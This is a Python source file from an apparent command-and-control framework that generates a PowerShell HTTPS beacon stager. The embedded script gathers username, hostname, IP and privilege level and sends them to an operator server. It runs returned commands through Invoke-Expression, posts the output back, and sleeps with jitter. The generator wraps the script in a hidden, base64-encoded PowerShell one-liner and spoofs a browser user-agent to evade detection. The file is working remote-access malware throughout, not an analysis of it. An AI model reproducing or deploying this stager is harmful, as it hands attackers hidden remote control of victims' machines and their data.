"""
HTTPS C2 stager — PowerShell beacon that polls the custom HTTPSListener.

Replaces the api.telegram.org IOC with operator-controlled infrastructure.
Supports malleable C2 profiles (user-agent, URIs, headers, body wrappers).
All beacon traffic is AES-256-GCM encrypted; profile headers added at send time.
"""
from __future__ import annotations

import base64
import os
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from fitnah.c2.profiles import C2Profile


@dataclass
class HttpsStagerConfig:
    c2_url:       str
    agent_id:     str
    auth_key:     str
    sleep_ms:     int             = 5000
    jitter:       float           = 0.20
    kill_date:    str             = ""     # "YYYY-MM-DD" — stager self-destructs after this date
    profile:      "C2Profile | None" = None
    extra_headers: dict[str, str] = field(default_factory=dict)


_PS1_TEMPLATE = r"""
#region --- Fitnah HTTPS beacon ---
$ErrorActionPreference = 'SilentlyContinue'

# Config
$C2Url      = '{{C2_URL}}'
$AgentId    = '{{AGENT_ID}}'
$AuthKey    = '{{AUTH_KEY}}'
$CheckinUri = '{{CHECKIN_URI}}'
$AckUri     = '{{ACK_URI}}'
$UserAgent  = '{{USER_AGENT}}'
$SleepMs    = {{SLEEP_MS}}
$Jitter     = {{JITTER}}
$KillDate   = '{{KILL_DATE}}'

# ── AES-256-GCM helpers ───────────────────────────────────────────────────
Add-Type -AssemblyName System.Security
Add-Type @'
using System;
using System.Security.Cryptography;
using System.Text;
public static class BeaconCrypto {
    public static byte[] DeriveKey(string authKey) {
        using (var sha = SHA256.Create())
            return sha.ComputeHash(Encoding.UTF8.GetBytes(authKey));
    }
    public static byte[] Encrypt(byte[] key, byte[] data) {
        try {
            var nonce = new byte[12];
            RandomNumberGenerator.Fill(nonce);
            var ct  = new byte[data.Length];
            var tag = new byte[16];
            using (var gcm = new AesGcm(key))
                gcm.Encrypt(nonce, data, ct, tag);
            var out2 = new byte[12 + 16 + ct.Length];
            Buffer.BlockCopy(nonce, 0, out2,  0, 12);
            Buffer.BlockCopy(tag,   0, out2, 12, 16);
            Buffer.BlockCopy(ct,    0, out2, 28, ct.Length);
            return out2;
        } catch {
            // XOR fallback for pre-.NET-5 hosts
            var r = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) r[i] = (byte)(data[i] ^ key[i % key.Length]);
            return r;
        }
    }
    public static byte[] Decrypt(byte[] key, byte[] data) {
        try {
            var nonce = new byte[12]; Buffer.BlockCopy(data,  0, nonce, 0, 12);
            var tag   = new byte[16]; Buffer.BlockCopy(data, 12, tag,   0, 16);
            var ct    = new byte[data.Length - 28];
            Buffer.BlockCopy(data, 28, ct, 0, ct.Length);
            var pt = new byte[ct.Length];
            using (var gcm = new AesGcm(key))
                gcm.Decrypt(nonce, ct, tag, pt);
            return pt;
        } catch {
            var r = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) r[i] = (byte)(data[i] ^ key[i % key.Length]);
            return r;
        }
    }
}
'@

$BeaconKey = [BeaconCrypto]::DeriveKey($AuthKey)

function Invoke-C2Post {
    param([string]$Uri, [string]$JsonBody)
    $url  = $C2Url.TrimEnd('/') + $Uri
    $body = [BeaconCrypto]::Encrypt($BeaconKey, [System.Text.Encoding]::UTF8.GetBytes($JsonBody))
    $b64  = [Convert]::ToBase64String($body)

    $req = [System.Net.WebRequest]::Create($url)
    $req.Method      = 'POST'
    $req.UserAgent   = $UserAgent
    $req.ContentType = 'application/octet-stream'
    $req.Headers.Add('X-Encrypted', '1')
    $req.Headers.Add('X-Agent-Key', $AuthKey)
    $req.Headers.Add('X-Agent-Id',  $AgentId)
    {{EXTRA_HEADERS}}
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($b64)
    $req.ContentLength = $bytes.Length
    $stream = $req.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()

    $resp       = $req.GetResponse()
    $reader     = New-Object System.IO.StreamReader($resp.GetResponseStream())
    $rawB64     = $reader.ReadToEnd().Trim()
    $reader.Close()
    $resp.Close()

    $encResp = [Convert]::FromBase64String($rawB64)
    $pt      = [BeaconCrypto]::Decrypt($BeaconKey, $encResp)
    return [System.Text.Encoding]::UTF8.GetString($pt) | ConvertFrom-Json
}

function Get-SysInfo {
    $u = $env:USERNAME; $h = $env:COMPUTERNAME
    $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
    $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
           Where-Object { $_.InterfaceAlias -notlike '*Loopback*' } |
           Select-Object -First 1).IPAddress
    $priv = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {'high'} else {'medium'}
    return @{
        agent_id   = $AgentId
        hostname   = $h
        username   = $u
        os         = $os
        ip         = $ip
        pid        = $PID
        integrity  = $priv
        type       = 'CHECKIN'
    } | ConvertTo-Json -Compress
}

function Invoke-Task {
    param([object]$Task)
    $output = ''
    try {
        switch ($Task.command) {
            'exec'  { $output = (Invoke-Expression $Task.args.cmd 2>&1) | Out-String }
            'ps'    { $output = (powershell.exe -NonInteractive -NoProfile -Command $Task.args.script 2>&1) | Out-String }
            'upload'{ # future: file download from C2
                $output = 'upload not implemented in PS stager'
            }
            default { $output = "unknown command: $($Task.command)" }
        }
    } catch {
        $output = "error: $_"
    }
    return @{
        type   = 'ACK'
        id     = $Task.id
        status = 'ok'
        output = $output
    } | ConvertTo-Json -Compress
}

# ── Kill date check ────────────────────────────────────────────────────────
if ($KillDate -ne '') {
    if ((Get-Date) -gt [datetime]::Parse($KillDate)) { exit 0 }
}

# ── Beacon loop ───────────────────────────────────────────────────────────
while ($true) {
    try {
        $checkin = Get-SysInfo
        $resp    = Invoke-C2Post -Uri $CheckinUri -JsonBody $checkin

        if ($resp.tasks) {
            foreach ($task in $resp.tasks) {
                $ack = Invoke-Task -Task $task
                Invoke-C2Post -Uri $AckUri -JsonBody $ack | Out-Null
            }
        }
    } catch { }

    # Sleep with jitter
    $base    = $SleepMs
    $jitterMs = [int]($base * $Jitter * (Get-Random -Minimum -1.0 -Maximum 1.0))
    $sleep   = [Math]::Max(500, $base + $jitterMs)
    Start-Sleep -Milliseconds $sleep
}
#endregion
""".lstrip()


class HttpsPs1Stager:
    """Generate a PowerShell HTTPS beacon stager for the custom HTTP listener."""

    @classmethod
    def generate(cls, cfg: HttpsStagerConfig) -> str:
        from fitnah.c2.profiles import C2Profile

        profile   = cfg.profile
        checkin   = profile.checkin_uri if profile else "/checkin"
        ack       = profile.ack_uri     if profile else "/ack"
        ua        = profile.user_agent  if (profile and profile.user_agent) else (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        )

        # Build uri_params suffix
        if profile and profile.uri_params:
            suffix = "?" + "&".join(profile.uri_params)
            checkin = checkin + suffix
            ack     = ack     + suffix

        # Build profile headers + extra
        all_headers: dict[str, str] = {}
        if profile:
            all_headers.update(profile.headers)
        all_headers.update(cfg.extra_headers)

        header_lines = "\n    ".join(
            f"$req.Headers.Add('{k}', '{v}')"
            for k, v in all_headers.items()
            if k.lower() not in ("content-type", "user-agent")
        )

        ps = _PS1_TEMPLATE
        ps = ps.replace("{{C2_URL}}",      cfg.c2_url)
        ps = ps.replace("{{AGENT_ID}}",    cfg.agent_id)
        ps = ps.replace("{{AUTH_KEY}}",    cfg.auth_key)
        ps = ps.replace("{{CHECKIN_URI}}", checkin)
        ps = ps.replace("{{ACK_URI}}",     ack)
        ps = ps.replace("{{USER_AGENT}}", ua)
        ps = ps.replace("{{SLEEP_MS}}",   str(cfg.sleep_ms))
        ps = ps.replace("{{JITTER}}",     f"{cfg.jitter:.2f}")
        ps = ps.replace("{{KILL_DATE}}",  cfg.kill_date)
        ps = ps.replace("{{EXTRA_HEADERS}}", header_lines)
        return ps

    @classmethod
    def generate_encoded(cls, cfg: HttpsStagerConfig) -> str:
        """Return a one-liner that base64-decodes and executes the stager."""
        ps_code = cls.generate(cfg)
        encoded = base64.b64encode(ps_code.encode("utf-16-le")).decode()
        return f"powershell -NoP -NonI -W Hidden -Enc {encoded}"
